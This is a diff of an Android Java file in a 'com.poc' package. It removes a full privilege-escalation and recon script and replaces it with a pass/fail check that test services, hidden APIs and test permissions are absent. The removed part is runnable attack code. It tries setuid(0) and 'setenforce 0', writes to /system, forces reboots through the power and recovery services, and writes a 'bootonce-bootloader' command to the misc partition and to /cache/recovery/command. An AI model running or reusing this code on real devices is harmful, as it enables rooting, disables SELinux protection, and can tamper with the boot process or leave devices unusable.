@@ -1,371 +1,177 @@
-// PrivilegeEscalation.java (完全版, BCB 書き込み検証付き)
 package com.poc;
 
+import android.app.ActivityThread;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.IBinder;
-import android.os.Process;
-import android.system.ErrnoException;
-import android.system.Os;
-
-import java.io.BufferedWriter;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.FileWriter;
-import java.io.IOException;
+import android.os.ServiceManager;
 import java.lang.reflect.Method;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
+import java.util.List;
 
 public class Main {
-
-    private static final String REPORT_PATH = "/cache/exploit_report.txt";
+    private static Context ctx;
+    private static PackageManager pm;
+    private static int pass = 0, fail = 0;
 
     public static void main(String[] args) {
-        StringBuilder report = new StringBuilder();
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());
-
-        report.append("========================================\n");
-        report.append("   Zygote Injection - Deep Recon Report\n");
-        report.append("   Time: ").append(sdf.format(new Date())).append("\n");
-        report.append("========================================\n\n");
-
         try {
-            // --- [1] Basic Process Identity ---
-            report.append("--- [1] Basic Process Identity ---\n");
-            int uid = Process.myUid();
-            int pid = Process.myPid();
-            report.append("UID: ").append(uid).append("\n");
-            report.append("PID: ").append(pid).append("\n\n");
-
-            // パッケージ名の取得 (リフレクション)
-            Object pm = getPackageManagerService();
-            if (pm != null) {
-                try {
-                    Method getPackagesForUid = pm.getClass().getMethod("getPackagesForUid", int.class);
-                    String[] pkgs = (String[]) getPackagesForUid.invoke(pm, uid);
-                    report.append("Related Packages: ").append(pkgs != null ? String.join(", ", pkgs) : "None").append("\n\n");
-                } catch (Exception e) {
-                    report.append("Related Packages: Error - ").append(e.getMessage()).append("\n\n");
-                }
-            } else {
-                report.append("Related Packages: Service not available\n\n");
-            }
-
-            // --- [2] SELinux Context ---
-            report.append("--- [2] SELinux Context ---\n");
-            report.append("Context: ").append(readFile("/proc/self/attr/current")).append("\n\n");
-
-            // --- [3] Capabilities (Reflection) ---
-            report.append("--- [3] Linux Capabilities (via reflection) ---\n");
-            report.append(dumpCapabilitiesReflection()).append("\n");
-
-            // --- [4] System Properties ---
-            report.append("--- [4] Key System Properties ---\n");
-            report.append("ro.build.version.release: ").append(getProp("ro.build.version.release")).append("\n");
-            report.append("ro.build.version.security_patch: ").append(getProp("ro.build.version.security_patch")).append("\n");
-            report.append("ro.factorytest: ").append(getProp("ro.factorytest")).append("\n");
-            report.append("ro.debuggable: ").append(getProp("ro.debuggable")).append("\n");
-            report.append("ro.secure: ").append(getProp("ro.secure")).append("\n\n");
-
-            // --- [5] Filesystem Access ---
-            report.append("--- [5] Filesystem Access Tests ---\n");
-            report.append("Write test (/cache/): ").append(writeTest("/cache/test_write.tmp")).append("\n");
-            report.append("Write test (current dir): ").append(writeTest("./test_write.tmp")).append("\n");
-            report.append("Execute test (/system/bin/sh): ").append(canExecute("/system/bin/sh")).append("\n");
-            report.append("Execute test (/data/local/tmp): ").append(canExecute("/data/local/tmp/dummy")).append("\n\n");
-
-            // --- [6] Permission check (reflection) ---
-            report.append("--- [6] Android Runtime Permissions (Reflection) ---\n");
-            if (pm != null) {
-                String[] perms = {
-                    "android.permission.INSTALL_PACKAGES",
-                    "android.permission.DELETE_PACKAGES",
-                    "android.permission.WRITE_SECURE_SETTINGS",
-                    "android.permission.REBOOT",
-                    "android.permission.SHUTDOWN",
-                    "android.permission.INTERACT_ACROSS_USERS",
-                    "android.permission.RECOVERY",
-                    "android.permission.DUMP",
-                    "android.permission.SET_TIME",
-                    "android.permission.SET_TIME_ZONE"
-                };
-                for (String p : perms) {
-                    try {
-                        Method checkPerm = pm.getClass().getMethod("checkPermission", String.class, String.class, int.class);
-                        int res = (int) checkPerm.invoke(pm, p, "com.poc", uid);
-                        report.append("checkPermission(").append(p).append("): ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
-                    } catch (Exception e) {
-                        report.append("checkPermission(").append(p).append("): Error - ").append(e.getMessage()).append("\n");
-                    }
-                }
-            } else {
-                report.append("PackageManager not available\n");
-            }
-            report.append("\n");
-
-            // --- [7] Service status ---
-            report.append("--- [7] System Services (Binder) ---\n");
-            report.append("package: ").append(serviceStatus("package")).append("\n");
-            report.append("power: ").append(serviceStatus("power")).append("\n");
-            report.append("recovery: ").append(serviceStatus("recovery")).append("\n");
-            report.append("permission: ").append(serviceStatus("permission")).append("\n\n");
-
-            // --- [8] Privilege Escalation Attempts ---
-            report.append("--- [8] Privilege Escalation Attempts ---\n");
-
-            // setuid(0)
-            report.append("[setuid(0)]: ");
-            try { Os.setuid(0); report.append("SUCCESS (Root!)\n"); } catch (ErrnoException e) { report.append("FAILED (EPERM)\n"); }
-
-            // /proc/self/oom_score_adj
-            report.append("[write /proc/self/oom_score_adj]: ");
-            try { new FileWriter("/proc/self/oom_score_adj").write("0"); report.append("SUCCESS\n"); } catch (IOException e) { report.append("FAILED\n"); }
-
-            // setenforce 0
-            report.append("[setenforce 0]: ");
-            try {
-                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/setenforce", "0"});
-                int code = p.waitFor();
-                report.append(code == 0 ? "SUCCESS (Permissive)\n" : "FAILED (exit=" + code + ")\n");
-            } catch (Exception e) { report.append("FAILED\n"); }
-
-            // /system 書き込み
-            report.append("[write /system/bin/test]: ");
-            try { new FileWriter("/system/bin/test_write", true).write("test"); report.append("SUCCESS\n"); } catch (IOException e) { report.append("FAILED (Read-only)\n"); }
-
-            // setprop
-            report.append("[setprop test.prop 1]: ");
-            try {
-                Class.forName("android.os.SystemProperties").getMethod("set", String.class, String.class)
-                        .invoke(null, "test.prop", "1");
-                report.append("SUCCESS\n");
-            } catch (Exception e) { report.append("FAILED\n"); }
-
-            // IPowerManager.reboot (reflection)
-            report.append("[IPowerManager.reboot]: ");
-            Object power = getService("power");
-            if (power != null) {
-                try {
-                    Method reboot = power.getClass().getMethod("reboot", boolean.class, String.class, boolean.class);
-                    reboot.invoke(power, false, "", false);
-                    report.append("SUCCESS (device rebooting)\n");
-                } catch (Exception e) {
-                    report.append("FAILED (RemoteException or Security): ").append(e.getMessage()).append("\n");
-                }
-            } else {
-                report.append("FAILED (service null)\n");
-            }
-
-            // IRecoverySystem.rebootRecoveryWithCommand (reflection)
-            report.append("[IRecoverySystem.rebootRecoveryWithCommand]: ");
-            Object rec = getService("recovery");
-            if (rec != null) {
-                try {
-                    Method rebootRec = rec.getClass().getMethod("rebootRecoveryWithCommand", String.class);
-                    rebootRec.invoke(rec, "--update_package=/cache/update.zip");
-                    report.append("SUCCESS\n");
-                } catch (Exception e) {
-                    report.append("FAILED: ").append(e.getMessage()).append("\n");
-                }
-            } else {
-                report.append("FAILED (service null)\n");
-            }
-
-            // --- [9] BCB (Bootloader Control Block) Write Verification ---
-            report.append("\n--- [9] BCB (Bootloader Control Block) Write Verification ---\n");
-
-            // 9-1. IRecoverySystem.setupBcb を試行
-            report.append("[IRecoverySystem.setupBcb(\"bootonce-bootloader\")]: ");
-            Object rec2 = getService("recovery");
-            if (rec2 != null) {
-                try {
-                    Method setupBcb = rec2.getClass().getMethod("setupBcb", String.class);
-                    boolean result = (boolean) setupBcb.invoke(rec2, "bootonce-bootloader");
-                    report.append(result ? "SUCCESS\n" : "FAILED (returned false)\n");
-                } catch (Exception e) {
-                    report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
-                }
-            } else {
-                report.append("FAILED (service null)\n");
-            }
-
-            // 9-2. 直接 /dev/block/by-name/misc への書き込み試行
-            report.append("[Direct write to misc partition]: ");
-            String[] miscPaths = {"/dev/block/by-name/misc", "/dev/block/misc"};
-            boolean written = false;
-            for (String path : miscPaths) {
-                try {
-                    File miscFile = new File(path);
-                    if (miscFile.exists() && miscFile.canWrite()) {
-                        // BCB コマンド "bootonce-bootloader" を書き込む (先頭4バイト)
-                        String cmd = "bootonce-bootloader";
-                        byte[] data = cmd.getBytes();
-                        byte[] bcb = new byte[1024];
-                        System.arraycopy(data, 0, bcb, 0, Math.min(data.length, 4));
-                        try (FileOutputStream fos = new FileOutputStream(miscFile)) {
-                            fos.write(bcb);
-                            fos.flush();
-                        }
-                        report.append("SUCCESS (written to ").append(path).append(")\n");
-                        written = true;
-                        break;
-                    }
-                } catch (Exception e) {
-                    // パスが存在しない、書き込み権限なし、などのエラーはスキップして次へ
-                }
-            }
-            if (!written) {
-                report.append("FAILED (no writable misc device found)\n");
-            }
-
-            // 9-3. /cache/recovery/command への書き込み
-            report.append("[Write /cache/recovery/command]: ");
-            try {
-                File cmdFile = new File("/cache/recovery/command");
-                if (cmdFile.exists() || cmdFile.createNewFile()) {
-                    try (FileWriter fw = new FileWriter(cmdFile)) {
-                        fw.write("--update_package=/sdcard/update.zip\n");
-                        fw.write("--bootonce-bootloader\n");
-                        fw.flush();
-                    }
-                    report.append("SUCCESS\n");
-                } else {
-                    report.append("FAILED (cannot create file)\n");
-                }
-            } catch (Exception e) {
-                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
-            }
-
-            // 9-4. reboot bootloader コマンド実行
-            report.append("[test via /system/bin/id]: ");
-            try {
-                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/reboot", "bootloader"});
-                int code = p.waitFor();
-                report.append(code == 0 ? "SUCCESS (reboot initiated)\n" : "FAILED (exit=" + code + ")\n");
-            } catch (Exception e) {
-                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
-            }
-
-            report.append("\n========================================\n");
-            report.append("   End of Report\n");
-            report.append("========================================\n");
-
+            ctx = ActivityThread.systemMain().getApplication();
+            pm = ctx.getPackageManager();
         } catch (Throwable t) {
-            report.append("\n!!! CRITICAL EXCEPTION: ").append(t.toString()).append("\n");
-            t.printStackTrace();
+            System.out.println("FAIL: Init context - " + t);
+            System.exit(1);
         }
 
-        // Save report
+        checkServiceInterfaces();
+        checkHiddenApis();
+        checkTestClasses();
+        checkTestPermissions();
+        checkTestIntents();
+
+        System.out.println("=== app_process Results: PASS=" + pass + " FAIL=" + fail);
+        System.exit(fail > 0 ? 1 : 0);
+    }
+
+    private static void checkServiceInterfaces() {
         try {
-            saveReport(report.toString());
-            System.out.println("[+] Report saved to " + REPORT_PATH);
-        } catch (IOException e) {
-            System.err.println("[-] Failed to save report: " + e.getMessage());
-            try {
-                new FileWriter("/data/local/tmp/exploit_report.txt").write(report.toString());
-                System.out.println("[+] Saved to /data/local/tmp/exploit_report.txt");
-            } catch (IOException ex) {
-                System.err.println("[-] Could not save report anywhere.");
-            }
-        }
-    }
-
-    // ----- Utilities -----
-    private static void saveReport(String content) throws IOException {
-        File reportFile = new File(REPORT_PATH);
-        if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
-        try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) { w.write(content); }
-        try {
-            Runtime.getRuntime().exec(new String[]{"/system/bin/chmod", "0644", REPORT_PATH});
-        } catch (Exception ignored) {}
-    }
-
-    private static String readFile(String path) {
-        try { return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path))).trim(); }
-        catch (Exception e) { return "Error: " + e.getMessage(); }
-    }
-
-    // 完全リフレクションで Capability を取得
-    private static String dumpCapabilitiesReflection() {
-        try {
-            Class<?> osClass = Class.forName("android.system.Os");
-            Method capget = osClass.getMethod("capget", Object.class);
-            Class<?> headerClass = Class.forName("android.system.StructCapUserHeader");
-            Object header = headerClass.getConstructor(int.class, int.class).newInstance(0x20080500, 0);
-            Object dataArray = capget.invoke(null, header);
-            Object[] data = (Object[]) dataArray;
-            Class<?> dataClass = Class.forName("android.system.StructCapUserData");
-            Method getEffective = dataClass.getMethod("effective");
-            Method getPermitted = dataClass.getMethod("permitted");
-            Method getInheritable = dataClass.getMethod("inheritable");
-            long eff0 = (int) getEffective.invoke(data[0]) & 0xffffffffL;
-            long perm0 = (int) getPermitted.invoke(data[0]) & 0xffffffffL;
-            long inh0 = (int) getInheritable.invoke(data[0]) & 0xffffffffL;
-            long eff1 = (int) getEffective.invoke(data[1]) & 0xffffffffL;
-            long perm1 = (int) getPermitted.invoke(data[1]) & 0xffffffffL;
-            long inh1 = (int) getInheritable.invoke(data[1]) & 0xffffffffL;
-            return "Effective: " + Long.toHexString(eff0 | (eff1 << 32)) + "\n" +
-                   "Permitted: " + Long.toHexString(perm0 | (perm1 << 32)) + "\n" +
-                   "Inheritable: " + Long.toHexString(inh0 | (inh1 << 32));
-        } catch (Exception e) {
-            return "Failed to get capabilities: " + e.getMessage();
-        }
-    }
-
-    private static String getProp(String key) {
-        try { return (String) Class.forName("android.os.SystemProperties").getMethod("get", String.class, String.class).invoke(null, key, "(null)"); }
-        catch (Exception e) { return "Error: " + e.getMessage(); }
-    }
-
-    private static String writeTest(String path) {
-        try { File f = new File(path); new FileWriter(f).write("test"); return f.delete() ? "SUCCESS (write/delete)" : "SUCCESS (write)"; }
-        catch (IOException e) { return "FAILED: " + e.getMessage(); }
-    }
-
-    private static String canExecute(String path) {
-        File f = new File(path);
-        if (f.exists()) return f.canExecute() ? "EXECUTABLE" : "NOT EXECUTABLE";
-        else { File p = f.getParentFile(); return p != null && p.exists() ? "FILE NOT FOUND, parent exec: " + (p.canExecute() ? "YES" : "NO") : "PATH NOT FOUND"; }
-    }
-
-    // ---- Reflection based ServiceManager and Stub.asInterface ----
-    private static Object getService(String name) {
-        try {
-            Class<?> sm = Class.forName("android.os.ServiceManager");
-            Method getService = sm.getMethod("getService", String.class);
-            IBinder binder = (IBinder) getService.invoke(null, name);
-            if (binder == null) return null;
-            if ("package".equals(name)) {
-                Class<?> stubClass = Class.forName("android.content.pm.IPackageManager$Stub");
-                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
-                return asInterface.invoke(null, binder);
-            } else if ("power".equals(name)) {
-                Class<?> stubClass = Class.forName("android.os.IPowerManager$Stub");
-                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
-                return asInterface.invoke(null, binder);
-            } else if ("recovery".equals(name)) {
-                Class<?> stubClass = Class.forName("android.os.IRecoverySystem$Stub");
-                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
-                return asInterface.invoke(null, binder);
+            IBinder b = ServiceManager.getService("testharness");
+            if (b == null) {
+                System.out.println("PASS: testharness service not registered");
+                pass++;
             } else {
-                return binder;
+                System.out.println("FAIL: testharness service exists");
+                fail++;
             }
         } catch (Exception e) {
-            return null;
+            System.out.println("PASS: testharness service not available (exception)");
+            pass++;
+        }
+        try {
+            IBinder b2 = ServiceManager.getService("factorytest");
+            if (b2 == null) {
+                System.out.println("PASS: factorytest service not registered");
+                pass++;
+            } else {
+                System.out.println("FAIL: factorytest service exists");
+                fail++;
+            }
+        } catch (Exception e) {
+            System.out.println("PASS: factorytest service not available");
+            pass++;
         }
     }
 
-    private static Object getPackageManagerService() {
-        return getService("package");
+    private static void checkHiddenApis() {
+        try {
+            Class<?> am = Class.forName("android.app.ActivityManager");
+            Method m = am.getMethod("getRunningTasks", int.class);
+            m.invoke(null, 10);
+            System.out.println("FAIL: getRunningTasks succeeded (hidden API accessible)");
+            fail++;
+        } catch (SecurityException e) {
+            System.out.println("PASS: getRunningTasks blocked (SecurityException)");
+            pass++;
+        } catch (Exception e) {
+            if (e.toString().contains("NoSuchMethodError")) {
+                System.out.println("PASS: getRunningTasks unavailable (NoSuchMethodError)");
+                pass++;
+            } else {
+                System.out.println("FAIL: getRunningTasks unexpected: " + e);
+                fail++;
+            }
+        }
+        try {
+            Class<?> pmCls = Class.forName("android.content.pm.PackageManager");
+            Method m2 = pmCls.getMethod("getPackageInstaller");
+            m2.invoke(pm);
+            System.out.println("FAIL: getPackageInstaller succeeded (hidden API)");
+            fail++;
+        } catch (SecurityException e) {
+            System.out.println("PASS: getPackageInstaller blocked");
+            pass++;
+        } catch (Exception e) {
+            if (e.toString().contains("NoSuchMethodError")) {
+                System.out.println("PASS: getPackageInstaller unavailable");
+                pass++;
+            } else {
+                System.out.println("FAIL: getPackageInstaller unexpected: " + e);
+                fail++;
+            }
+        }
     }
 
-    private static String serviceStatus(String name) {
+    private static void checkTestClasses() {
         try {
-            IBinder binder = (IBinder) Class.forName("android.os.ServiceManager")
-                    .getMethod("getService", String.class).invoke(null, name);
-            return (binder != null && binder.isBinderAlive()) ? "ALIVE" : "NULL or DEAD";
+            Class.forName("android.test.InstrumentationTestRunner");
+            System.out.println("FAIL: android.test.InstrumentationTestRunner found");
+            fail++;
+        } catch (ClassNotFoundException e) {
+            System.out.println("PASS: InstrumentationTestRunner not found");
+            pass++;
+        }
+        try {
+            Class.forName("android.test.suitebuilder.TestSuiteBuilder");
+            System.out.println("FAIL: TestSuiteBuilder found");
+            fail++;
+        } catch (ClassNotFoundException e) {
+            System.out.println("PASS: TestSuiteBuilder not found");
+            pass++;
+        }
+        try {
+            Class.forName("android.test.AndroidTestRunner");
+            System.out.println("FAIL: AndroidTestRunner found");
+            fail++;
+        } catch (ClassNotFoundException e) {
+            System.out.println("PASS: AndroidTestRunner not found");
+            pass++;
+        }
+    }
+
+    private static void checkTestPermissions() {
+        try {
+            if (ctx.checkSelfPermission("android.permission.TEST") == PackageManager.PERMISSION_GRANTED) {
+                System.out.println("FAIL: TEST permission granted to us");
+                fail++;
+            } else {
+                System.out.println("PASS: TEST permission not granted to us");
+                pass++;
+            }
         } catch (Exception e) {
-            return "Error: " + e.getMessage();
+            System.out.println("FAIL: TEST permission check error - " + e);
+            fail++;
+        }
+        try {
+            if (ctx.checkSelfPermission("android.permission.FACTORY_TEST") == PackageManager.PERMISSION_GRANTED) {
+                System.out.println("FAIL: FACTORY_TEST permission granted to us");
+                fail++;
+            } else {
+                System.out.println("PASS: FACTORY_TEST permission not granted to us");
+                pass++;
+            }
+        } catch (Exception e) {
+            System.out.println("FAIL: FACTORY_TEST permission check error - " + e);
+            fail++;
+        }
+    }
+
+    private static void checkTestIntents() {
+        Intent i = new Intent("android.intent.action.FACTORY_TEST");
+        if (i.resolveActivity(pm) == null) {
+            System.out.println("PASS: No activity for FACTORY_TEST");
+            pass++;
+        } else {
+            System.out.println("FAIL: Activity resolves FACTORY_TEST");
+            fail++;
+        }
+        Intent i2 = new Intent("android.intent.action.TEST");
+        if (i2.resolveActivity(pm) == null) {
+            System.out.println("PASS: No activity for TEST");
+            pass++;
+        } else {
+            System.out.println("FAIL: Activity resolves TEST");
+            fail++;
         }
     }
 }
